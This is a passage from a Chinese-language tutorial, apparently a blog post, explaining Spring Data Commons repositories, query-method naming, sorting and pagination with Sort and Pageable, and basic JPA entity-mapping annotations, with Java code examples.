<li><strong>高度重复</strong>: <code>findById</code>, <code>findAll</code>, <code>save</code>, <code>delete</code> 的实现逻辑在99%的情况下都是完全一样的，但我们却要为每个实体都写一遍。</li>
<li><strong>容易出错</strong>: 手动编写JPQL或SQL语句容易出现拼写错误。</li>
<li><strong>工作量大</strong>: 应用中有几十个实体，就意味着要写几十个这样的实现类。</li>
</ol>
<hr>
<h4 id="2-1-2-核心理念：统一的数据访问抽象-Unified-Data-Access-Abstraction"><a href="#2-1-2-核心理念：统一的数据访问抽象-Unified-Data-Access-Abstraction" class="headerlink" title="2.1.2 核心理念：统一的数据访问抽象 (Unified Data Access Abstraction)"></a>2.1.2 核心理念：统一的数据访问抽象 (Unified Data Access Abstraction)</h4><p><strong>Spring Data Commons 的核心理念</strong>就是为了解决上述痛点，它旨在提供一个<strong>统一的、基于Repository模式的数据访问层抽象</strong>，使得开发者无论使用何种持久化技术（关系型数据库、NoSQL数据库等），都能享有一致的、极简的编程模型。</p>
<p><strong>Spring Data Commons 本身不提供任何具体的数据访问实现</strong>。它就像一个**“规范”<strong>或</strong>“蓝图”<strong>，定义了一系列通用的接口和注解。而 Spring Data JPA, Spring Data MongoDB 等具体的模块，则是对这个“规范”的</strong>具体实现**。</p>
<p>这个理念主要通过以下两大支柱来实现：</p>
<h5 id="1-Repository-模式的终极抽象"><a href="#1-Repository-模式的终极抽象" class="headerlink" title="1. Repository 模式的终极抽象"></a>1. Repository 模式的终极抽象</h5><p>Spring Data Commons 将<strong>仓储模式 (Repository Pattern)</strong> 提升到了一个新的高度。它提供了一系列核心接口，开发者只需要继承这些接口，<strong>无需编写任何实现代码</strong>，就能在运行时自动获得强大的数据访问能力。</p>
<ul>
<li><strong><code>Repository&lt;T, ID&gt;</code></strong>:<ul>
<li>最顶层的<strong>标记接口 (Marker Interface)</strong>。它本身不包含任何方法。</li>
<li>它的作用是告诉Spring Data：“这个接口是一个用于数据访问的Repository”。</li>
<li><code>T</code> 代表实体类型（如 <code>User</code>），<code>ID</code> 代表主键类型（如 <code>Long</code>）。</li>
</ul>
</li>
<li><strong><code>CrudRepository&lt;T, ID&gt;</code></strong>:<ul>
<li>继承自 <code>Repository</code>，提供了最基础、最通用的<strong>CRUD</strong>方法。</li>
<li>例如：<code>save()</code>, <code>findById()</code>, <code>findAll()</code>, <code>count()</code>, <code>deleteById()</code>, <code>existsById()</code> 等。</li>
<li><strong>在 90% 的场景下，继承这个接口就足够了</strong>。</li>
</ul>
</li>
<li><strong><code>PagingAndSortingRepository&lt;T, ID&gt;</code></strong>:<ul>
<li>继承自 <code>CrudRepository</code>，额外增加了对<strong>分页 (Pagination)</strong> 和<strong>排序 (Sorting)</strong> 的支持。</li>
<li>例如：<code>findAll(Sort sort)</code>, <code>findAll(Pageable pageable)</code>。</li>
</ul>
</li>
</ul>
<p><strong>核心魔法</strong>：</p>
<p>当你定义一个接口 <code>interface UserRepository extends CrudRepository&lt;User, Long&gt; {}</code> 时，Spring Data在应用启动时，会通过<strong>动态代理 (Dynamic Proxy)</strong> 技术，在内存中<strong>自动为你生成这个接口的实现类</strong>。这个实现类包含了所有<code>CrudRepository</code>中定义方法的高效实现。你只需要定义接口，实现由框架搞定！</p>
<hr>
<h5 id="2-约定优于配置-Convention-over-Configuration-的查询方法"><a href="#2-约定优于配置-Convention-over-Configuration-的查询方法" class="headerlink" title="2. 约定优于配置 (Convention over Configuration) 的查询方法"></a>2. 约定优于配置 (Convention over Configuration) 的查询方法</h5><p>这是 Spring Data 另一个“杀手锏”功能，被称为 <strong>Query Methods</strong> 或 <strong>方法命名查询</strong>。</p>
<ul>
<li><strong>理念</strong>: 你不再需要手写JPQL或SQL查询语句。你只需要按照<strong>预定义的命名约定</strong>来<strong>声明一个方法</strong>，Spring Data 就会在运行时<strong>解析这个方法名</strong>，并<strong>自动为你生成并执行对应的查询</strong>。</li>
<li><strong>命名约定</strong>: <code>find...By...</code>, <code>read...By...</code>, <code>query...By...</code>, <code>count...By...</code>, <code>get...By...</code><ul>
<li><code>findByUsername(String username)</code> -&gt; <code>WHERE username = ?</code></li>
<li><code>findByUsernameAndPassword(String username, String password)</code> -&gt; <code>WHERE username = ? AND password = ?</code></li>
<li><code>findByAgeGreaterThan(int age)</code> -&gt; <code>WHERE age &gt; ?</code></li>
<li><code>findFirst10ByOrderByUsernameDesc()</code> -&gt; <code>WHERE ... ORDER BY username DESC LIMIT 10</code></li>
</ul>
</li>
</ul>
<p><strong>一个形象的比喻</strong>:</p>
<p>可以把 Spring Data Commons 与 Java 的 <code>Collection</code> 框架类比：</p>
<table>
<thead>
<tr>
<th align="left">Java Collection 框架</th>
<th align="left">Spring Data Commons 体系</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong><code>Collection&lt;T&gt;</code></strong> (顶层接口)</td>
<td align="left"><strong><code>Repository&lt;T, ID&gt;</code></strong> (顶层标记接口)</td>
</tr>
<tr>
<td align="left"><strong><code>List&lt;T&gt;</code></strong> (具体接口)</td>
<td align="left"><strong><code>CrudRepository&lt;T, ID&gt;</code></strong> (具体接口)</td>
</tr>
<tr>
<td align="left"><code>new ArrayList&lt;T&gt;()</code> (具体实现)</td>
<td align="left"><code>spring-boot-starter-data-jpa</code> (具体实现模块)</td>
</tr>
</tbody></table>
<p>你编程时面向的是 <code>List</code> 接口，而不需要关心底层是 <code>ArrayList</code>还是 <code>LinkedList</code>。同样，你编程时面向的是 <code>CrudRepository</code>，Spring Data Commons 确保了无论你将来把底层的数据源从JPA换成MongoDB，你的Repository接口和业务代码几乎<strong>无需改动</strong>。</p>
<hr>
<h3 id="2-2-通用功能"><a href="#2-2-通用功能" class="headerlink" title="2.2 通用功能"></a>2.2 通用功能</h3><p>除了提供基础的Repository抽象，Spring Data Commons 还内置了对分页和排序的通用支持。这意味着，无论你使用 Spring Data JPA、Spring Data MongoDB 还是其他模块，进行分页和排序的<strong>编程方式是完全一致的</strong>。</p>
<h4 id="2-2-1-排序-Sorting"><a href="#2-2-1-排序-Sorting" class="headerlink" title="2.2.1 排序 (Sorting)"></a>2.2.1 排序 (Sorting)</h4><h5 id="1-Sort-对象"><a href="#1-Sort-对象" class="headerlink" title="1. Sort 对象"></a>1. <code>Sort</code> 对象</h5><p><code>org.springframework.data.domain.Sort</code> 是一个用于封装排序信息的类。</p>
<ul>
<li><p><strong>创建 <code>Sort</code> 对象</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 按单个字段升序 (默认)</span></span><br><span class="line"><span class="type">Sort</span> <span class="variable">sortByUsernameAsc</span> <span class="operator">=</span> Sort.by(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 按单个字段降序</span></span><br><span class="line"><span class="type">Sort</span> <span class="variable">sortByCreateTimeDesc</span> <span class="operator">=</span> Sort.by(Sort.Direction.DESC, <span class="string">&quot;createTime&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 组合多个排序条件 (按年龄降序，如果年龄相同，再按用户名升序)</span></span><br><span class="line"><span class="type">Sort</span> <span class="variable">sortByAgeDescAndUsernameAsc</span> <span class="operator">=</span> Sort.by(<span class="string">&quot;age&quot;</span>).descending()</span><br><span class="line">                                       .and(Sort.by(<span class="string">&quot;username&quot;</span>).ascending());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种链式写法</span></span><br><span class="line"><span class="type">Sort</span> <span class="variable">complexSort</span> <span class="operator">=</span> Sort.by(</span><br><span class="line">    Sort.Order.desc(<span class="string">&quot;priority&quot;</span>),</span><br><span class="line">    Sort.Order.asc(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="2-在Repository中使用-Sort"><a href="#2-在Repository中使用-Sort" class="headerlink" title="2. 在Repository中使用 Sort"></a>2. 在Repository中使用 <code>Sort</code></h5><ol>
<li><p><strong>对于 <code>CrudRepository</code></strong>: 它自身没有直接支持排序的方法，但你可以在<strong>方法命名查询</strong>中嵌入排序规则。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">CrudRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    <span class="comment">// 方法名中直接包含排序规则</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByStatusOrderByCreateTimeDesc</span><span class="params">(String status)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>对于 <code>PagingAndSortingRepository</code></strong>: 这个接口继承自 <code>CrudRepository</code>，并额外提供了一个接收 <code>Sort</code> 参数的 <code>findAll</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// PagingAndSortingRepository 继承了 CrudRepository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRepository</span> <span class="keyword">extends</span> <span class="title class_">PagingAndSortingRepository</span>&lt;Product, Long&gt; &#123;</span><br><span class="line"><span class="comment">// 该接口自带 findAll(Sort sort) 方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Service层中使用</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductService</span> &#123;    </span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ProductRepository productRepository;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> List&lt;Product&gt; <span class="title function_">getProductsSortedByPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Sort</span> <span class="variable">sortByPriceAsc</span> <span class="operator">=</span> Sort.by(<span class="string">&quot;price&quot;</span>).ascending();</span><br><span class="line">        <span class="keyword">return</span> (List&lt;Product&gt;) productRepository.findAll(sortByPriceAsc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在自定义查询方法中使用 <code>Sort</code></strong>: 你也可以在自定义的查询方法中添加一个 <code>Sort</code> 类型的参数，Spring Data会自动应用这个排序规则。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">CrudRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    <span class="comment">// Spring Data会解析方法名生成查询条件 (WHERE status = ?)，</span></span><br><span class="line">    <span class="comment">// 然后将传入的Sort对象动态地应用到查询的 ORDER BY 子句上。</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByStatus</span><span class="params">(String status, Sort sort)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Service层中使用</span></span><br><span class="line"><span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getActiveUsersSorted</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Sort</span> <span class="variable">sort</span> <span class="operator">=</span> Sort.by(<span class="string">&quot;lastName&quot;</span>).ascending();</span><br><span class="line">    <span class="keyword">return</span> userRepository.findByStatus(<span class="string">&quot;ACTIVE&quot;</span>, sort);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h4 id="2-2-2-分页-Pagination"><a href="#2-2-2-分页-Pagination" class="headerlink" title="2.2.2 分页 (Pagination)"></a>2.2.2 分页 (Pagination)</h4><p>当查询结果集非常大时，一次性加载所有数据是不现实的，这会导致内存溢出和性能问题。分页查询是必须的。Spring Data Commons 提供了 <code>Pageable</code> 和 <code>Page</code> 两个核心接口来优雅地处理分页。</p>
<h5 id="1-Pageable-接口-请求分页"><a href="#1-Pageable-接口-请求分页" class="headerlink" title="1. Pageable 接口 (请求分页)"></a>1. <code>Pageable</code> 接口 (请求分页)</h5><p><code>org.springframework.data.domain.Pageable</code> 是一个接口，用于<strong>封装分页请求信息</strong>，通常由客户端（或Service层）传入。</p>
<ul>
<li><p><strong>核心信息</strong>:</p>
<ul>
<li><strong>页码 (Page Number)</strong>: 请求的是第几页（<strong>从0开始</strong>）。</li>
<li><strong>每页大小 (Page Size)</strong>: 每页希望返回多少条记录。</li>
<li><strong>排序信息 (Sort)</strong>: 一个可选的 <code>Sort</code> 对象，用于对当前页的数据进行排序。</li>
</ul>
</li>
<li><p><strong>创建 <code>Pageable</code> 对象</strong>:<br>通常使用其实现类 <code>PageRequest</code> 来创建。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建一个简单的分页请求：请求第 0 页，每页 10 条数据</span></span><br><span class="line"><span class="type">Pageable</span> <span class="variable">firstPageWithTenElements</span> <span class="operator">=</span> PageRequest.of(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个带排序的分页请求：请求第 2 页，每页 5 条，按用户名降序</span></span><br><span class="line"><span class="type">Pageable</span> <span class="variable">thirdPageWithFiveElementsSorted</span> <span class="operator">=</span> PageRequest.of(<span class="number">2</span>, <span class="number">5</span>, Sort.by(<span class="string">&quot;username&quot;</span>).descending());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以先创建Sort对象</span></span><br><span class="line"><span class="type">Sort</span> <span class="variable">sort</span> <span class="operator">=</span> Sort.by(<span class="string">&quot;createTime&quot;</span>).descending();</span><br><span class="line"><span class="type">Pageable</span> <span class="variable">pageableWithSort</span> <span class="operator">=</span> PageRequest.of(<span class="number">0</span>, <span class="number">20</span>, sort);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h5 id="2-Page-接口-响应分页"><a href="#2-Page-接口-响应分页" class="headerlink" title="2. Page&lt;T&gt; 接口 (响应分页)"></a>2. <code>Page&lt;T&gt;</code> 接口 (响应分页)</h5><p><code>org.springframework.data.domain.Page&lt;T&gt;</code> 是一个接口，用于<strong>封装分页查询的结果</strong>。它不仅仅包含了当前页的数据列表，还包含了丰富的<strong>分页元数据 (metadata)</strong>，非常便于前端展示分页控件。</p>
<ul>
<li><strong>核心信息</strong>:<ul>
<li><code>List&lt;T&gt; getContent()</code>: 获取当前页的数据列表。</li>
<li><code>int getTotalPages()</code>: 获取总页数。</li>
<li><code>long getTotalElements()</code>: 获取总记录数。</li>
<li><code>int getNumber()</code>: 获取当前页码（从0开始）。</li>
<li><code>int getSize()</code>: 获取当前页的实际大小。</li>
<li><code>int getNumberOfElements()</code>: 获取当前页的记录数。</li>
<li><code>boolean hasContent()</code>: 判断当前页是否有数据。</li>
<li><code>boolean isFirst()</code>: 是否是第一页。</li>
<li><code>boolean isLast()</code>: 是否是最后一页。</li>
<li><code>boolean hasNext()</code>: 是否有下一页。</li>
<li><code>boolean hasPrevious()</code>: 是否有上一页。</li>
<li><code>Pageable nextPageable()</code>: 获取请求下一页的 <code>Pageable</code> 对象。</li>
<li><code>Pageable previousPageable()</code>: 获取请求上一页的 <code>Pageable</code> 对象。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="3-在Repository中使用分页"><a href="#3-在Repository中使用分页" class="headerlink" title="3. 在Repository中使用分页"></a>3. 在Repository中使用分页</h5><ol>
<li><p><strong>继承 <code>PagingAndSortingRepository</code></strong>: 这个接口直接提供了 <code>findAll(Pageable pageable)</code> 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ProductRepository</span> <span class="keyword">extends</span> <span class="title class_">PagingAndSortingRepository</span>&lt;Product, Long&gt; &#123;</span><br><span class="line">    <span class="comment">// 自带 Page&lt;Product&gt; findAll(Pageable pageable);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在自定义查询方法中使用 <code>Pageable</code></strong>:</p>
<ul>
<li>在任何自定义的查询方法中，只要将<strong>最后一个参数</strong>设置为 <code>Pageable</code> 类型，并且<strong>返回类型</strong>是 <code>Page&lt;T&gt;</code>，Spring Data就会自动执行分页查询。</li>
<li>它会执行<strong>两次</strong>查询：一次是获取总记录数的 <code>COUNT</code> 查询，一次是获取当前页数据的分页查询。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">PagingAndSortingRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    <span class="comment">// 根据状态查询用户，并进行分页</span></span><br><span class="line">    Page&lt;User&gt; <span class="title function_">findByStatus</span><span class="params">(String status, Pageable pageable)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在Service层中使用</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Page&lt;User&gt; <span class="title function_">findActiveUsers</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建分页请求对象，按创建时间降序</span></span><br><span class="line">        <span class="type">Pageable</span> <span class="variable">pageable</span> <span class="operator">=</span> PageRequest.of(page, size, Sort.by(<span class="string">&quot;createTime&quot;</span>).descending());</span><br><span class="line">        <span class="keyword">return</span> userRepository.findByStatus(<span class="string">&quot;ACTIVE&quot;</span>, pageable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在Controller中与Spring MVC集成</strong>:<br>Spring MVC可以自动将HTTP请求中的 <code>page</code>, <code>size</code>, <code>sort</code> 参数解析并组装成一个 <code>Pageable</code> 对象，直接注入到Controller方法中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 客户端可以这样请求: /users?page=0&amp;size=10&amp;sort=username,desc</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Page&lt;User&gt; <span class="title function_">getActiveUsers</span><span class="params">(Pageable pageable)</span> &#123;</span><br><span class="line">        <span class="comment">// Spring MVC 已经自动根据请求参数创建好了 pageable 对象</span></span><br><span class="line">        <span class="keyword">return</span> userService.findActiveUsers(pageable); <span class="comment">// Service层也需要一个接收Pageable的方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个自动化集成极大地简化了分页API的开发。</p>
</li>
</ol>
<hr>
<h2 id="3-Spring-Data-JPA"><a href="#3-Spring-Data-JPA" class="headerlink" title="3. Spring Data JPA"></a>3. Spring Data JPA</h2><p><strong>核心接口</strong></p>
<p>Spring Data JPA 的核心是围绕一系列<strong>层层递进、功能不断增强</strong>的Repository接口构建的。开发者通过继承这些接口，可以“免费”获得大量预先实现好的数据访问方法。这个接口的继承体系主要源自 Spring Data Commons，在第上一章已经介绍过了。</p>
<h3 id="3-1-实体映射"><a href="#3-1-实体映射" class="headerlink" title="3.1 实体映射"></a>3.1 实体映射</h3><p>实体映射是通过一系列的 <strong>JPA (Java Persistence API)</strong> 注解来完成的。这些注解告诉JPA提供者（如Hibernate）如何将一个普通的Java类（POJO）转换为可以被数据库持久化的<strong>实体 (Entity)</strong>。</p>
<hr>
<h4 id="3-1-1-Entity-声明实体"><a href="#3-1-1-Entity-声明实体" class="headerlink" title="3.1.1 @Entity - 声明实体"></a>3.1.1 <code>@Entity</code> - 声明实体</h4><ul>
<li><strong>作用</strong>: <strong>这是最重要的注解</strong>。它标记在一个类上，向JPA声明这个类是一个实体类，它将<strong>映射到数据库中的一张表</strong>。</li>
<li><strong>要求</strong>:<ol>
<li>该类必须有一个<strong>无参的构造函数</strong>（可以是<code>public</code>或<code>protected</code>），JPA需要用它来创建实体实例。</li>
<li>该类不能是 <code>final</code> 的，因为JPA提供者可能需要创建代理子类来实现懒加载等特性。</li>
<li>必须包含一个<strong>主键</strong>，通过<code>@Id</code>注解标记。</li>
</ol>
</li>
<li><strong><code>@Table</code> - 指定表名</strong><ul>
<li><strong>作用</strong>: 与 <code>@Entity</code> 配合使用，用于<strong>显式指定</strong>该实体映射到的数据库表的<strong>名称</strong>。</li>
<li><strong>常用属性</strong>:<ul>
<li><code>name</code>: 指定表名。</li>
<li><code>schema</code>: 指定数据库的模式（Schema）。</li>
<li><code>uniqueConstraints</code>: 定义唯一约束。</li>
</ul>
</li>
<li><strong>约定</strong>: 如果<strong>不使用</strong><code>@Table</code>注解，JPA默认会使用<strong>类名</strong>作为表名（命名策略可能因配置而异，如驼峰转下划线<code>UserInfo</code> -&gt; <code>user_info</code>）。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Table;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span> <span class="comment">// 声明这是一个实体类</span></span><br><span class="line"><span class="meta">@Table(name = &quot;tbl_user&quot;)</span> <span class="comment">// 映射到数据库中的 &#x27;tbl_user&#x27; 表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="comment">// ... 字段和方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-1-2-Id-GeneratedValue-定义主键"><a href="#3-1-2-Id-GeneratedValue-定义主键" class="headerlink" title="3.1.2 @Id &amp; @GeneratedValue - 定义主键"></a>3.1.2 <code>@Id</code> &amp; <code>@GeneratedValue</code> - 定义主键</h4><ul>
<li><strong><code>@Id</code></strong>:<ul>
<li><strong>作用</strong>: 标记在实体的某个字段上，声明该字段是实体类的<strong>主键 (Primary Key)</strong>，对应数据库表的主键列。<strong>每个实体必须有且只有一个<code>@Id</code></strong>。</li>
</ul>
</li>
<li><strong><code>@GeneratedValue</code></strong>:<ul>
<li><strong>作用</strong>: 与 <code>@Id</code> 配合使用，用于指定<strong>主键的生成策略</strong>。如果主键是由数据库自动生成的（如自增ID），则必须使用此注解。</li>
<li><strong>核心属性 <code>strategy</code></strong>:<ul>
<li><strong><code>GenerationType.AUTO</code> (默认值)</strong>:<ul>
<li>JPA提供者（Hibernate）会自动选择一个最适合当前数据库的策略。对于MySQL，它会选择<code>IDENTITY</code>；对于Oracle，会选择<code>SEQUENCE</code>。<strong>通常使用默认值即可</strong>。</li>
</ul>
</li>
<li><strong><code>GenerationType.IDENTITY</code></strong>:<ul>
<li>表示主键由数据库的<strong>自增列</strong>生成。适用于支持自增的数据库，如MySQL, SQL Server。</li>
<li>这是最常用的一种策略。</li>
</ul>
</li>
<li><strong><code>GenerationType.SEQUENCE</code></strong>:<ul>
<li>使用数据库的<strong>序列 (Sequence)</strong> 来生成主键。适用于Oracle, PostgreSQL等支持序列的数据库。</li>
<li>需要配合 <code>@SequenceGenerator</code> 注解来指定序列的名称。</li>
</ul>
</li>
<li><strong><code>GenerationType.TABLE</code></strong>:<ul>
<li>使用一张特定的数据库表来模拟序列的功能。这种方式性能较差，已很少使用。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GeneratedValue;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.GenerationType;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span> <span class="comment">// 使用数据库自增策略</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 其他字段</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-1-3-Column-Basic-映射普通列"><a href="#3-1-3-Column-Basic-映射普通列" class="headerlink" title="3.1.3 @Column &amp; @Basic - 映射普通列"></a>3.1.3 <code>@Column</code> &amp; <code>@Basic</code> - 映射普通列</h4><ul>
<li><strong><code>@Column</code></strong>:<ul>
<li><strong>作用</strong>: 标记在实体的字段上，用于<strong>精细化控制</strong>该字段如何映射到数据库表的<strong>列 (Column)</strong>。</li>
<li><strong>常用属性</strong>:<ul>
<li><code>name</code>: 指定数据库列的名称。如果不指定，默认使用字段名。</li>
<li><code>length</code>: 指定列的长度（主要用于<code>VARCHAR</code>类型），默认255。</li>
<li><code>nullable</code>: 是否允许为<code>null</code>，默认<code>true</code>。设置为<code>false</code>会生成<code>NOT NULL</code>约束。</li>
<li><code>unique</code>: 是否是唯一约束，默认<code>false</code>。</li>
<li><code>columnDefinition</code>: 允许你直接定义该列的DDL片段，如<code>columnDefinition = &quot;TEXT&quot;</code>或<code>columnDefinition = &quot;DECIMAL(10, 2) DEFAULT 0.00&quot;</code>。</li>
<li><code>updatable</code>: 该列是否会包含在<code>UPDATE</code>语句中，默认<code>true</code>。</li>
<li><code>insertable</code>: 该列是否会包含在<code>INSERT</code>语句中，默认<code>true</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>@Basic</code></strong>:<ul>
<li>JPA默认会将所有未被注解的、非<code>static</code>、非<code>transient</code>的字段都当作持久化字段处理，这背后其实是隐式地使用了 <code>@Basic</code> 注解。</li>
<li>你<strong>几乎不需要显式使用</strong><code>@Basic</code>。它的主要作用是控制字段的<strong>加载策略</strong> (<code>fetch</code>属性，<code>FetchType.EAGER</code>或<code>FetchType.LAZY</code>），但这对于基本类型字段的懒加载通常意义不大。</li>
</ul>
</li>
</ul>
<p><strong>示例</strong>:</p>
